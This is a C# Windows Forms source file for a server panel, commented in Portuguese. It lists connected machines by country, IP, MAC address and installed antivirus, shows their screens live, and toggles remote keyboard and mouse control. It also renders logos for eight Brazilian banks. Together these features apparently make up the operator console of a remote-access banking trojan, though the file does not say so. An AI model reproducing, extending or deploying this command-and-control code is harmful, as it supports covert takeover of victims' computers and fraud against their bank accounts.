using System;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.Extensions.Hosting;
using System.IO;
using System.Threading;
using System.Linq;
using ExemploGrpc;

public class MainForm : Form
{
    // Cabeçalho
    private readonly Panel headerPanel = new Panel();
    private readonly Panel statusDot = new Panel();
    private readonly Label lblStatus = new Label();
    private readonly Label lblPort = new Label();
    private readonly Label lblHint = new Label();
    private readonly Button btnToggle = new Button();

    // GroupBox de controle de entrada
    private readonly GroupBox gbInput = new GroupBox();
    private readonly CheckBox chkKeyboard = new CheckBox();
    private readonly CheckBox chkMouse = new CheckBox();

    // Lista + ícones
    private readonly ListView lvClients = new ListView();
    private readonly ImageList _columnIcons = new ImageList();
    private readonly ImageList _bankLogos = new ImageList();

    // Painel de log
    private readonly Panel logPanel = new Panel();
    private readonly TextBox txtLog = new TextBox();
    private readonly Button btnCopyLog = new Button();
    private readonly Label lblLogTitle = new Label();

    // Host gRPC
    private IHost? _host;
    private bool _serverOn;
    // Quando true, mudanças programáticas em checkboxes não devem enviar comandos
    private bool _suppressInputEvents = false;
    private readonly object _stopLock = new object();
    private bool _stopping;

    // Timer para atualizar ping na UI (usa Threading.Timer para não depender da UI thread)
    private System.Threading.Timer? _pingTimer;

    public MainForm()
    {
        try
        {
            Text = "Servidor Screen Panel";
            Width = 1100;
            Height = 650;
            StartPosition = FormStartPosition.CenterScreen;

            BackColor = Color.FromArgb(30, 30, 30);
            ForeColor = Color.White;

            InitHeader();
            InitIcons();
            InitBankLogos();
            InitListView();
            InitLogPanel();

            // Ordem importa por causa do Dock
            Controls.Add(logPanel);
            Controls.Add(lvClients);
            Controls.Add(headerPanel);

            ClientManager.Instance.ClientConnected += OnClientConnected;
            ClientManager.Instance.ClientDisconnected += OnClientDisconnected;

            // Inicia servidor ao abrir
            StartServer();

            // Timer para atualizar coluna de ping a cada 2s (mais responsivo)
            _pingTimer = new System.Threading.Timer(_ => PingTimer_Callback(), null, 2000, 2000);
        }
        catch (Exception ex)
        {
            string errorMsg = $"Erro na inicialização do MainForm: {ex.Message}\n{ex.StackTrace}";
            string logPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "ServidorScreenPanel_error.log");
            try
            {
                System.IO.File.AppendAllText(logPath, $"{DateTime.Now:yyyy-MM-dd HH:mm:ss} - {errorMsg}\n");
            }
            catch { }
            throw;
        }
    }

    protected override void OnFormClosed(FormClosedEventArgs e)
    {
        // Pare o servidor antes de executar a limpeza padrão do Form
        try { StopServer(); } catch { }
        try { _pingTimer?.Dispose(); } catch { }
        base.OnFormClosed(e);
    }

    // =========================================================
    // HEADER
    // =========================================================
    private void InitHeader()
    {
        headerPanel.Dock = DockStyle.Top;
        headerPanel.Height = 90;
        headerPanel.BackColor = Color.FromArgb(45, 45, 48);

        // Bolinha de status
        statusDot.Width = 14;
        statusDot.Height = 14;
        statusDot.Left = 20;
        statusDot.Top = 20;
        statusDot.BackColor = Color.LimeGreen;
        statusDot.BorderStyle = BorderStyle.FixedSingle;

        // Texto "Servidor ON/OFF"
        lblStatus.AutoSize = true;
        lblStatus.Left = statusDot.Right + 10;
        lblStatus.Top = statusDot.Top - 2;
        lblStatus.Font = new Font(Font.FontFamily, 11, FontStyle.Bold);
        lblStatus.Text = "Servidor ON";

        // Texto da porta
        lblPort.AutoSize = true;
        lblPort.Left = lblStatus.Right + 20;
        lblPort.Top = lblStatus.Top;
        lblPort.ForeColor = Color.LightGray;
        lblPort.Text = $"Escutando na porta {Program.ServerPort} (HTTP/2)";

        // Dica embaixo
        lblHint.AutoSize = true;
        lblHint.Left = lblStatus.Left;
        lblHint.Top = lblStatus.Bottom + 12;
        lblHint.ForeColor = Color.Silver;
        lblHint.Text = "Aguardando conexões de clientes... (baixando tela em tempo real)";

        // Botão ON/OFF
        btnToggle.Width = 140;
        btnToggle.Height = 32;
        btnToggle.Text = "Desligar servidor";
        btnToggle.BackColor = Color.FromArgb(63, 63, 70);
        btnToggle.ForeColor = Color.White;
        btnToggle.FlatStyle = FlatStyle.Flat;
        btnToggle.FlatAppearance.BorderSize = 0;
        btnToggle.Top = 20;
        btnToggle.Left = headerPanel.Width - btnToggle.Width - 20;
        btnToggle.Anchor = AnchorStyles.Top | AnchorStyles.Right;
        btnToggle.Click += BtnToggle_Click;

        headerPanel.Controls.Add(statusDot);
        headerPanel.Controls.Add(lblStatus);
        headerPanel.Controls.Add(lblPort);
        headerPanel.Controls.Add(lblHint);
        headerPanel.Controls.Add(btnToggle);
    }

    // =========================================================
    // GROUPBOX DE CONTROLE (TECLADO / MOUSE)
    // =========================================================
    private void InitInputGroup()
    {
        gbInput.Text = "Controle de entrada";
        gbInput.Dock = DockStyle.Top;
        gbInput.Height = 60;
        gbInput.ForeColor = Color.White;
        gbInput.BackColor = Color.FromArgb(40, 40, 40);

        chkKeyboard.Text = "Teclado";
        chkKeyboard.AutoSize = true;
        chkKeyboard.Left = 20;
        chkKeyboard.Top = 25;
        chkKeyboard.Enabled = false;
        chkKeyboard.Name = "chkKeyboardMain";
        chkKeyboard.TabStop = false;
        chkKeyboard.AutoCheck = false; // Impedir toggle por teclado
        chkKeyboard.CheckedChanged += ChkKeyboard_CheckedChanged;
        chkKeyboard.Click += ChkKeyboard_Click;

        chkMouse.Text = "Mouse";
        chkMouse.AutoSize = true;
        chkMouse.Left = chkKeyboard.Right + 40;
        chkMouse.Top = chkKeyboard.Top;
        chkMouse.Enabled = false;
        chkMouse.Name = "chkMouseMain";
        chkMouse.TabStop = false;
        chkMouse.AutoCheck = false; // Impedir toggle por teclado
        chkMouse.CheckedChanged += ChkMouse_CheckedChanged;
        chkMouse.Click += ChkMouse_Click;

        gbInput.Controls.Add(chkKeyboard);
        gbInput.Controls.Add(chkMouse);
    }

    // =========================================================
    // ÍCONES (PC/IP/MAC/AV/PING)
    // =========================================================
    private void InitIcons()
    {
        _columnIcons.ImageSize = new Size(16, 16);
        _columnIcons.ColorDepth = ColorDepth.Depth32Bit;

        _columnIcons.Images.Add(CreateCircleIcon("PC", Color.DodgerBlue));       // 0
        _columnIcons.Images.Add(CreateCircleIcon("IP", Color.MediumSeaGreen));   // 1
        _columnIcons.Images.Add(CreateCircleIcon("M", Color.Goldenrod));         // 2 (MAC)
        _columnIcons.Images.Add(CreateCircleIcon("AV", Color.OrangeRed));        // 3
        _columnIcons.Images.Add(CreateCircleIcon("P", Color.Cyan));              // 4 (Ping)
    }

    private static Image CreateCircleIcon(string text, Color color)
    {
        var bmp = new Bitmap(16, 16);
        using var g = Graphics.FromImage(bmp);
        g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;

        using (var b = new SolidBrush(color))
            g.FillEllipse(b, 0, 0, 15, 15);

        using var font = new Font("Segoe UI", 6, FontStyle.Bold);
        using var sf = new StringFormat { Alignment = StringAlignment.Center, LineAlignment = StringAlignment.Center };
        using var tb = new SolidBrush(Color.White);
        g.DrawString(text, font, tb, new RectangleF(0, 0, 16, 16), sf);

        return bmp;
    }

    // =========================================================
    // LOGOS DOS BANCOS
    // =========================================================
    private void InitBankLogos()
    {
        _bankLogos.ImageSize = new Size(80, 30);
        _bankLogos.ColorDepth = ColorDepth.Depth32Bit;

        // Criar logos estilizados para cada banco com cores oficiais
        _bankLogos.Images.Add("BB", CreateBankLogo("BB", Color.FromArgb(255, 204, 0), Color.FromArgb(0, 51, 160))); // Amarelo e azul BB
        _bankLogos.Images.Add("CEF", CreateBankLogo("CAIXA", Color.FromArgb(0, 104, 180), Color.White)); // Azul Caixa
        _bankLogos.Images.Add("ITAU", CreateBankLogo("ITAÚ", Color.FromArgb(236, 109, 0), Color.White)); // Laranja Itaú
        _bankLogos.Images.Add("BRADESCO", CreateBankLogo("BRADESCO", Color.FromArgb(204, 9, 47), Color.White)); // Vermelho Bradesco
        _bankLogos.Images.Add("SANTANDER", CreateBankLogo("SANTANDER", Color.FromArgb(236, 0, 0), Color.White)); // Vermelho Santander
        _bankLogos.Images.Add("SICRED", CreateBankLogo("SICREDI", Color.FromArgb(0, 169, 78), Color.White)); // Verde Sicredi
        _bankLogos.Images.Add("SICOOB", CreateBankLogo("SICOOB", Color.FromArgb(0, 103, 56), Color.White)); // Verde escuro Sicoob
        _bankLogos.Images.Add("BNB", CreateBankLogo("BNB", Color.FromArgb(0, 86, 150), Color.White)); // Azul BNB
    }

    private static Image CreateBankLogo(string text, Color bgColor, Color textColor)
    {
        var bmp = new Bitmap(80, 30);
        using var g = Graphics.FromImage(bmp);
        g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
        g.TextRenderingHint = System.Drawing.Text.TextRenderingHint.AntiAlias;

        // Fundo com gradiente sutil
        using (var brush = new System.Drawing.Drawing2D.LinearGradientBrush(
            new Rectangle(0, 0, 80, 30),
            bgColor,
            Color.FromArgb(Math.Max(0, bgColor.R - 20), Math.Max(0, bgColor.G - 20), Math.Max(0, bgColor.B - 20)),
            45f))
        {
            g.FillRoundedRectangle(brush, 0, 0, 79, 29, 6);
        }

        // Borda sutil
        using (var pen = new Pen(Color.FromArgb(50, Color.Black), 1))
        {
            g.DrawRoundedRectangle(pen, 0, 0, 79, 29, 6);
        }

        // Texto do banco
        using var font = new Font("Segoe UI", text.Length > 6 ? 9 : 11, FontStyle.Bold);
        using var sf = new StringFormat { Alignment = StringAlignment.Center, LineAlignment = StringAlignment.Center };
        using var textBrush = new SolidBrush(textColor);

        // Sombra do texto
        using (var shadowBrush = new SolidBrush(Color.FromArgb(40, Color.Black)))
        {
            g.DrawString(text, font, shadowBrush, new RectangleF(1, 1, 80, 30), sf);
        }

        g.DrawString(text, font, textBrush, new RectangleF(0, 0, 80, 30), sf);

        return bmp;
    }

    // =========================================================
    // LISTVIEW
    // =========================================================
    private void InitListView()
    {
        lvClients.Dock = DockStyle.Fill;
        lvClients.View = View.Details;
        lvClients.FullRowSelect = true;
        lvClients.GridLines = true;
        lvClients.BorderStyle = BorderStyle.None;
        lvClients.BackColor = Color.FromArgb(37, 37, 38);
        lvClients.ForeColor = Color.White;
        lvClients.SmallImageList = _columnIcons;
        lvClients.OwnerDraw = true;

        lvClients.Columns.Add("País", 120);
        lvClients.Columns.Add("PC", 180);
        lvClients.Columns.Add("IP", 130);
        lvClients.Columns.Add("MAC", 150);
        lvClients.Columns.Add("Antivírus", 150);
        lvClients.Columns.Add("Ping", 70);
        lvClients.Columns.Add("Conectado em", 180);

        lvClients.DoubleClick += LvClients_DoubleClick;
        lvClients.SelectedIndexChanged += LvClients_SelectedIndexChanged;

        lvClients.DrawColumnHeader += (s, e) => e.DrawDefault = true;
        lvClients.DrawItem += (s, e) => { }; // desenhamos tudo em DrawSubItem
        lvClients.DrawSubItem += LvClients_DrawSubItem;
    }

    private void LvClients_DrawSubItem(object? sender, DrawListViewSubItemEventArgs e)
    {
        var g = e.Graphics;
        var bounds = e.Bounds;

        bool selected = (e.ItemState & ListViewItemStates.Selected) != 0;
        using (var bg = new SolidBrush(selected ? Color.FromArgb(0, 122, 204) : lvClients.BackColor))
        {
            g.FillRectangle(bg, bounds);
        }

        int iconIndex = -1;
        if (e.ColumnIndex == 1) iconIndex = 0;      // PC
        else if (e.ColumnIndex == 2) iconIndex = 1; // IP
        else if (e.ColumnIndex == 3) iconIndex = 2; // MAC
        else if (e.ColumnIndex == 4) iconIndex = 3; // AV
        else if (e.ColumnIndex == 5) iconIndex = 4; // Ping

        int offsetX = bounds.Left + 4;

        if (iconIndex >= 0)
        {
            var img = _columnIcons.Images[iconIndex];
            int y = bounds.Top + (bounds.Height - img.Height) / 2;
            g.DrawImage(img, offsetX, y);
            offsetX += img.Width + 4;
        }

        var textColor = selected ? Color.White : lvClients.ForeColor;

        TextRenderer.DrawText(
            g,
            e.SubItem?.Text ?? string.Empty,
            lvClients.Font,
            new Rectangle(offsetX, bounds.Top, bounds.Width - (offsetX - bounds.Left), bounds.Height),
            textColor,
            TextFormatFlags.Left | TextFormatFlags.VerticalCenter
        );

        using var pen = new Pen(Color.FromArgb(60, 60, 60));
        g.DrawRectangle(pen, bounds.Left, bounds.Top, bounds.Width - 1, bounds.Height - 1);
    }

    // =========================================================
    // PAINEL DE LOG
    // =========================================================
    private void InitLogPanel()
    {
        logPanel.Dock = DockStyle.Bottom;
        logPanel.Height = 150;
        logPanel.BackColor = Color.FromArgb(40, 40, 40);
        logPanel.BorderStyle = BorderStyle.FixedSingle;

        lblLogTitle.Text = "Log de Eventos";
        lblLogTitle.ForeColor = Color.White;
        lblLogTitle.Font = new Font(Font.FontFamily, 10, FontStyle.Bold);
        lblLogTitle.Dock = DockStyle.Top;
        lblLogTitle.Height = 24;
        lblLogTitle.TextAlign = ContentAlignment.MiddleLeft;
        lblLogTitle.Padding = new Padding(10, 0, 0, 0);

        txtLog.Multiline = true;
        txtLog.ReadOnly = true;
        txtLog.BackColor = Color.FromArgb(30, 30, 30);
        txtLog.ForeColor = Color.LimeGreen;
        txtLog.Font = new Font("Consolas", 8);
        txtLog.BorderStyle = BorderStyle.None;
        txtLog.Dock = DockStyle.Fill;
        txtLog.WordWrap = false;

        btnCopyLog.Text = "Copiar Log";
        btnCopyLog.Width = 100;
        btnCopyLog.Height = 32;
        btnCopyLog.ForeColor = Color.White;
        btnCopyLog.BackColor = Color.FromArgb(63, 63, 70);
        btnCopyLog.FlatStyle = FlatStyle.Flat;
        btnCopyLog.FlatAppearance.BorderSize = 0;
        btnCopyLog.Dock = DockStyle.Right;
        btnCopyLog.Margin = new Padding(5);
        btnCopyLog.Click += BtnCopyLog_Click;

        logPanel.Controls.Add(txtLog);
        logPanel.Controls.Add(btnCopyLog);
        logPanel.Controls.Add(lblLogTitle);
    }

    private void BtnCopyLog_Click(object? sender, EventArgs e)
    {
        if (!string.IsNullOrEmpty(txtLog.Text))
        {
            Clipboard.SetText(txtLog.Text);
            MessageBox.Show("Log copiado para a área de transferência!", "Sucesso", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }

    public void AddLog(string message)
    {
        if (InvokeRequired)
        {
            Invoke(() => AddLog(message));
            return;
        }

        string logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
        txtLog.AppendText(logEntry + Environment.NewLine);
        
        // Manter apenas as últimas 1000 linhas para não sobrecarregar
        var lines = txtLog.Lines.ToList();
        if (lines.Count > 1000)
        {
            lines = lines.TakeLast(500).ToList();
            txtLog.Text = string.Join(Environment.NewLine, lines);
        }
    }

    // Atualiza estado dos checkboxes de input para uma sessão sem disparar envio de comandos
    public void UpdateSessionInputState(ClientSession session, bool? keyboard = null, bool? mouse = null)
    {
        if (InvokeRequired)
        {
            BeginInvoke(new Action(() => UpdateSessionInputState(session, keyboard, mouse)));
            return;
        }

        if (session == null) return;

        if (keyboard.HasValue)
            session.IsKeyboardEnabled = keyboard.Value;
        if (mouse.HasValue)
            session.IsMouseEnabled = mouse.Value;

        // se a sessão selecionada for a mesma, atualiza os checkboxes visuais
        var sel = GetSelectedSession();
        if (sel != null && sel.Id == session.Id)
        {
            try
            {
                _suppressInputEvents = true;
                if (keyboard.HasValue) chkKeyboard.Checked = keyboard.Value;
                if (mouse.HasValue) chkMouse.Checked = mouse.Value;
            }
            finally { _suppressInputEvents = false; }
        }
    }

    // =========================================================
    // LIGAR / DESLIGAR SERVIDOR
    // =========================================================
    private async void BtnToggle_Click(object? sender, EventArgs e)
    {
        if (_serverOn)
        {
            // Chama a versão assíncrona para não bloquear a UI
            await StopServerAsync();
        }
        else
        {
            StartServer();
        }
    }

    private void StartServer()
    {
        if (_serverOn) return;

        _host = Program.CreateHostBuilder().Build();
        _host.Start();
        _serverOn = true;

        statusDot.BackColor = Color.LimeGreen;
        lblStatus.Text = "Servidor ON";
        lblPort.Text = $"Escutando na porta {Program.ServerPort} (HTTP/2)";
        btnToggle.Text = "Desligar servidor";
        lblHint.Text = "Aguardando conexões de clientes... (baixando tela em tempo real)";

        AtualizarEstadoInput();
    }
    private void StopServer()
    {
        // Mantém compatibilidade com chamadas sincronas (ex.: fechamento do form)
        StopServerAsync().ConfigureAwait(false).GetAwaiter().GetResult();
    }

    private async System.Threading.Tasks.Task StopServerAsync()
    {
        if (!_serverOn) return;

        // evita reentrância / chamadas concorrentes
        lock (_stopLock)
        {
            if (_stopping) return;
            _stopping = true;
        }

        try
        {
            // Atualiza UI para refletir que estamos parando
            try { btnToggle.Enabled = false; statusDot.BackColor = Color.Orange; lblStatus.Text = "Parando..."; } catch { }

            Log("StopServerAsync: iniciando desconexão de clientes (forçando limpeza)");

            try
            {
                // Desconecta todas as sessões ativas para evitar que streams pendentes bloqueiem o Stop
                var sessions = ClientManager.Instance.Clients.Values.ToArray();
                foreach (var s in sessions)
                {
                    try
                    {
                        Log($"StopServerAsync: enviando STOP para {s.Id}");
                        if (s.SendCommandAsync != null)
                        {
                            // tenta avisar o cliente para parar
                            await s.SendCommandAsync(new ExemploGrpc.ScreenCommand { Type = "STOP", Payload = "" }).ConfigureAwait(false);
                        }
                    }
                    catch (Exception ex)
                    {
                        Log($"StopServerAsync: falha ao enviar STOP para {s.Id}: " + ex.ToString());
                    }

                    try
                    {
                        // remove a sessão localmente
                        s.SendCommandAsync = null;
                        ClientManager.Instance.RemoveClient(s.Id);
                        Log($"StopServerAsync: sessão removida {s.Id}");
                    }
                    catch (Exception ex)
                    {
                        Log($"StopServerAsync: falha ao remover sessão {s.Id}: " + ex.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                Log("StopServerAsync: exceção ao desconectar clientes: " + ex.ToString());
            }

            Log("StopServerAsync: iniciando StopAsync()");

            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));

            try
            {
                if (_host != null)
                {
                    await _host.StopAsync(cts.Token).ConfigureAwait(false);
                    Log("StopServerAsync: StopAsync() finalizado");
                }
            }
            catch (OperationCanceledException ocex)
            {
                Log("StopServerAsync: timeout/operation canceled: " + ocex.ToString());
            }
            catch (Exception ex)
            {
                Log("StopServerAsync: exceção durante StopAsync: " + ex.ToString());
            }

            try
            {
                _host?.Dispose();
            }
            catch (Exception ex)
            {
                Log("StopServerAsync: exceção durante Dispose: " + ex.ToString());
            }

            _host = null;
            _serverOn = false;

            // Atualiza UI após finalização
            try
            {
                statusDot.BackColor = Color.Red;
                lblStatus.Text = "Servidor OFF";
                lblPort.Text = $"Porta {Program.ServerPort} (parado)";
                btnToggle.Text = "Ligar servidor";
                lblHint.Text = "Servidor desligado. Clique em 'Ligar servidor' para começar a escutar.";
            }
            catch { }

            lvClients.Items.Clear();
            // Ao atualizar programaticamente os checkboxes, suprimimos os eventos
            try
            {
                _suppressInputEvents = true;
                chkKeyboard.Checked = false;
                chkMouse.Checked = false;
            }
            finally
            {
                _suppressInputEvents = false;
            }

            chkKeyboard.Enabled = false;
            chkMouse.Enabled = false;
        }
        finally
        {
            lock (_stopLock)
            {
                _stopping = false;
            }

            try { btnToggle.Enabled = true; } catch { }
        }
    }

    // =========================================================
    // CLIENTES: ENTRA / SAI
    // =========================================================
    private void OnClientConnected(ClientSession session)
    {
        if (InvokeRequired)
        {
            BeginInvoke(new Action(() => OnClientConnected(session)));
            return;
        }

        var item = new ListViewItem(session.Country); // País
        item.SubItems.Add(session.PcName);            // PC
        item.SubItems.Add(session.Ip);                // IP
        item.SubItems.Add(session.MacAddress);        // MAC
        item.SubItems.Add(session.Antivirus);         // AV
        item.SubItems.Add(session.PingMs + " ms");    // Ping
        item.SubItems.Add(session.ConnectedAt.ToString("dd/MM/yyyy HH:mm:ss"));

        item.Tag = session;
        lvClients.Items.Add(item);

        AtualizarEstadoInput();
    }

    private void OnClientDisconnected(ClientSession session)
    {
        if (InvokeRequired)
        {
            BeginInvoke(new Action(() => OnClientDisconnected(session)));
            return;
        }

        foreach (ListViewItem it in lvClients.Items)
        {
            if (it.Tag is ClientSession s && s.Id == session.Id)
            {
                lvClients.Items.Remove(it);
                break;
            }
        }

        AtualizarEstadoInput();
    }

    // =========================================================
    // SELEÇÃO / GROUPBOX INPUT
    // =========================================================
    private void LvClients_SelectedIndexChanged(object? sender, EventArgs e)
    {
        AtualizarEstadoInput();
    }

    private ClientSession? GetSelectedSession()
    {
        if (lvClients.SelectedItems.Count == 0)
            return null;

        return lvClients.SelectedItems[0].Tag as ClientSession;
    }

    private void AtualizarEstadoInput()
    {
        var session = GetSelectedSession();
        bool enabled = _serverOn && session?.SendCommandAsync != null;

        chkKeyboard.Enabled = enabled;
        chkMouse.Enabled = enabled;
    }

    private void Log(string message)
    {
        try
        {
            var path = Path.Combine(Path.GetTempPath(), "ServidorScreenPanel.stop.log");
            File.AppendAllText(path, DateTime.Now.ToString("o") + " " + message + Environment.NewLine);
        }
        catch { }
    }

    private async void ChkKeyboard_CheckedChanged(object? sender, EventArgs e)
    {
        if (_suppressInputEvents) return; // mudança programática, ignora

        var session = GetSelectedSession();
        if (session?.SendCommandAsync == null) return;

        string type = chkKeyboard.Checked ? "KEYBOARD_ON" : "KEYBOARD_OFF";

        // Log local para entender a origem (MainForm)
        AddLog($"[INPUT] (Main) Teclado {(chkKeyboard.Checked ? "ATIVADO" : "DESATIVADO")} - {session.PcName}");

        try
        {
            await session.SendCommandAsync(new ScreenCommand
            {
                Type = type,
                Payload = ""
            });
        }
        catch (Exception ex)
        {
            MessageBox.Show("Erro ao enviar comando de teclado: " + ex.Message);
        }
    }

    private void ChkKeyboard_Click(object? sender, EventArgs e)
    {
        // Toggle manual por clique do mouse (já que AutoCheck = false)
        if (!_suppressInputEvents)
            chkKeyboard.Checked = !chkKeyboard.Checked;
    }

    private async void ChkMouse_CheckedChanged(object? sender, EventArgs e)
    {
        if (_suppressInputEvents) return;

        var session = GetSelectedSession();
        if (session?.SendCommandAsync == null) return;

        string type = chkMouse.Checked ? "MOUSE_ON" : "MOUSE_OFF";

        // Atualiza estado da sessão
        session.IsMouseEnabled = chkMouse.Checked;

        // log para rastrear origem das mudanças (inclui estado de supressão e controle com foco)
        string focused = this.ActiveControl?.Name ?? "null";
        AddLog($"[INPUT] (Main) Mouse {(chkMouse.Checked ? "ATIVADO" : "DESATIVADO")} - {session.PcName} (suppress={_suppressInputEvents}, focused={focused})");

        try
        {
            await session.SendCommandAsync(new ScreenCommand
            {
                Type = type,
                Payload = ""
            });
        }
        catch (Exception ex)
        {
            MessageBox.Show("Erro ao enviar comando de mouse: " + ex.Message);
        }
    }

    private void ChkMouse_Click(object? sender, EventArgs e)
    {
        // Toggle manual por clique do mouse (já que AutoCheck = false)
        if (!_suppressInputEvents)
            chkMouse.Checked = !chkMouse.Checked;
    }

    // =========================================================
    // ABRIR VISOR DE TELA
    // =========================================================
    private void LvClients_DoubleClick(object? sender, EventArgs e)
    {
        var session = GetSelectedSession();
        if (session == null) return;

        var viewer = new ScreenViewerForm(session, this);
        viewer.Show();
    }

    // =========================================================
    // ATUALIZA PING NA UI A CADA 5s
    // =========================================================
    // Callback executado por System.Threading.Timer
    private void PingTimer_Callback()
    {
        try
        {
            if (!IsHandleCreated) return;

            BeginInvoke(new Action(() =>
            {
                foreach (ListViewItem item in lvClients.Items)
                {
                    if (item.Tag is ClientSession s)
                    {
                        item.SubItems[5].Text = s.PingMs + " ms";
                    }
                }

                lvClients.Refresh();
            }));
        }
        catch { }
    }
}

// =========================================================
// EXTENSÕES PARA DESENHAR RETÂNGULOS ARREDONDADOS
// =========================================================
public static class GraphicsExtensions
{
    public static void FillRoundedRectangle(this Graphics g, Brush brush, int x, int y, int width, int height, int radius)
    {
        using var path = GetRoundedRectPath(x, y, width, height, radius);
        g.FillPath(brush, path);
    }

    public static void DrawRoundedRectangle(this Graphics g, Pen pen, int x, int y, int width, int height, int radius)
    {
        using var path = GetRoundedRectPath(x, y, width, height, radius);
        g.DrawPath(pen, path);
    }

    private static System.Drawing.Drawing2D.GraphicsPath GetRoundedRectPath(int x, int y, int width, int height, int radius)
    {
        var path = new System.Drawing.Drawing2D.GraphicsPath();
        int diameter = radius * 2;

        path.AddArc(x, y, diameter, diameter, 180, 90);
        path.AddArc(x + width - diameter, y, diameter, diameter, 270, 90);
        path.AddArc(x + width - diameter, y + height - diameter, diameter, diameter, 0, 90);
        path.AddArc(x, y + height - diameter, diameter, diameter, 90, 90);
        path.CloseFigure();

        return path;
    }
}
